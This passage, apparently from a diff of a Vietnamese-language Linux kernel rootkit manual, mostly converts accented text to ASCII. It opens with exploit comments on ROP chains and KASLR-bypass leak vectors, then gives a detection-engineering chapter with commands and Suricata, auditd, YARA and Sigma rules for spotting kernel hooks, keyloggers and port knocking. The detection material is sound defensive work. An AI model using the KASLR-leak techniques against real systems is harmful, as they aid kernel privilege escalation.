+ *   RAX set via earlier gadget toi mmap'd address.
  * ═══════════════════════════════════════════════════ */
 
 /* ═══════════════════════════════════════════════════
  * 5. KASLR Bypass
  *
- * KASLR randomizes kernel text base address mỗi boot.
- * Phải leak base address trước khi build ROP chain.
+ * KASLR randomizes kernel text base address moi boot.
+ * Phai leak base address truoc khi build ROP chain.
  *
  * Leak vectors:
- *   a) /proc/kallsyms (nếu kptr_restrict=0)
- *   b) dmesg (kernel pointers, nếu dmesg_restrict=0)
+ *   a) /proc/kallsyms (neu kptr_restrict=0)
+ *   b) dmesg (kernel pointers, neu dmesg_restrict=0)
  *   c) Side-channel (prefetch, TSX, spectre variants)
  *   d) Info leak vulnerability (uninitialized stack/heap data)
- *   e) /sys/kernel/notes (ELF notes chứa build-id → offset calc)
+ *   e) /sys/kernel/notes (ELF notes chua build-id -> offset calc)
  * ═══════════════════════════════════════════════════ */
 
 static unsigned long leak_kaslr_base(void)
@@ -11398,49 +15642,49 @@ static unsigned long leak_kaslr_base(void)
 
 ```bash
 # ═══════════════════════════════════════════════════════════════
-# BỔ SUNG Detection Engineering — Chapter 16
-# Cover mọi technique chưa có detection rule
+# BO SUNG Detection Engineering — Chapter 16
+# Cover moi technique chua co detection rule
 # ═══════════════════════════════════════════════════════════════
 
-# ── 1. VFS iterate_shared hook detection ──
-# Check nếu /proc file_operations bị modified
-# So sánh f_op pointer với expected kernel address
+# -- 1. VFS iterate_shared hook detection --
+# Check neu /proc file_operations bi modified
+# So sanh f_op pointer voi expected kernel address
 cat /proc/kallsyms | grep "proc_root_operations"
-# Nếu runtime f_op khác static value → hooked
+# Neu runtime f_op khac static value -> hooked
 
-# ── 2. Inline hook detection ──
-# Scan kernel text cho mov rax + jmp rax pattern tại function entry
+# -- 2. Inline hook detection --
+# Scan kernel text cho mov rax + jmp rax pattern tai function entry
 # Pattern: 48 b8 XX XX XX XX XX XX XX XX ff e0
 python3 -c "
 import mmap, re
 with open('/proc/kcore', 'rb') as f:
     mm = mmap.mmap(f.fileno(), 0, access=mmap.ACCESS_READ)
-    # Tìm trampoline pattern
+    # Tim trampoline pattern
     pattern = b'\\x48\\xb8.{8}\\xff\\xe0'
     for m in re.finditer(pattern, mm):
         print(f'Inline hook at offset {hex(m.start())}')
 " 2>/dev/null
 
-# ── 3. IDT modification detection ──
-# Compare IDT entries với expected values
+# -- 3. IDT modification detection --
+# Compare IDT entries voi expected values
 python3 -c "
-# Read IDTR và compare entries
+# Read IDTR va compare entries
 # Volatility: vol3 -f dump.raw linux.check_idt
 print('Use: vol3 linux.check_idt.CheckIDT')
 "
 
-# ── 4. MSR_LSTAR detection ──
-# Check MSR_LSTAR points vào kernel text
+# -- 4. MSR_LSTAR detection --
+# Check MSR_LSTAR points vao kernel text
 rdmsr 0xC0000082 2>/dev/null || echo "Install msr-tools"
-# Compare output với: grep entry_SYSCALL_64 /proc/kallsyms
+# Compare output voi: grep entry_SYSCALL_64 /proc/kallsyms
 
-# ── 5. LSM hook detection ──
+# -- 5. LSM hook detection --
 # List registered LSM modules
 cat /sys/kernel/security/lsm
 # Check cho unexpected entries
-# Compare security_hook_heads list count trước và sau
+# Compare security_hook_heads list count truoc va sau
 
-# ── 6. Port knock detection (Suricata rule) ──
+# -- 6. Port knock detection (Suricata rule) --
 cat > /etc/suricata/rules/rootkit.rules << 'SURICATA'
 # Detect port knocking pattern: 3 SYN packets to unusual ports < 5s
 alert tcp any any -> $HOME_NET any (msg:"Possible port knock sequence"; \
@@ -11458,7 +15702,7 @@ alert dns any any -> any 53 (msg:"DNS tunnel suspected"; \
     sid:1000003; rev:1;)
 SURICATA
 
-# ── 7. Auditd rules cho rootkit detection ──
+# -- 7. Auditd rules cho rootkit detection --
 cat > /etc/audit/rules.d/rootkit.rules << 'AUDIT'
 # Monitor module loading
 -w /sbin/insmod -p x -k rootkit_module_load
@@ -11481,7 +15725,7 @@ cat > /etc/audit/rules.d/rootkit.rules << 'AUDIT'
 -w /dev/input/ -p r -k input_device_access
 AUDIT
 
-# ── 8. Keylogger detection ──
+# -- 8. Keylogger detection --
 # Check registered keyboard notifiers
 cat /sys/kernel/debug/notifier/keyboard 2>/dev/null
 # Check input handlers
@@ -11489,24 +15733,24 @@ ls -la /dev/input/
 cat /proc/bus/input/handlers
 # Unexpected handler = potential keylogger
 
-# ── 9. Timestamp manipulation detection ──
+# -- 9. Timestamp manipulation detection --
 # Find files with timestamps matching /bin/ls (timestomped indicator)
 find / -newer /bin/ls -a ! -newer /bin/ls -maxdepth 3 2>/dev/null
 # Files with EXACT same mtime as /bin/ls = suspicious
 
-# ── 10. Container escape detection ──
-# From inside container: check nếu namespace changed
+# -- 10. Container escape detection --
+# From inside container: check neu namespace changed
 ls -la /proc/1/ns/ 2>/dev/null
-# Compare với expected container namespace IDs
+# Compare voi expected container namespace IDs
 # Mismatch = namespace escape
 
-# ── 11. /dev/kmem custom device detection ──
+# -- 11. /dev/kmem custom device detection --
 ls -la /dev/ | grep -v "^[bcd]" | grep -v "^l"
 # Unexpected character devices
 cat /proc/devices | grep -i "misc"
 # Check misc devices cho unexpected entries
 
-# ── 12. YARA rules bổ sung ──
+# -- 12. YARA rules bo sung --
 cat >> rootkit_detector.yar << 'YARA'
 
 rule LD_Preload_Rootkit {
@@ -11549,7 +15793,7 @@ rule Encrypted_C2_Module {
 }
 YARA
 
-# ── 13. Sigma rule cho persistence methods ──
+# -- 13. Sigma rule cho persistence methods --
 cat > persistence_detect.yml << 'SIGMA'
 title: Rootkit Persistence via Udev Rule
 status: experimental
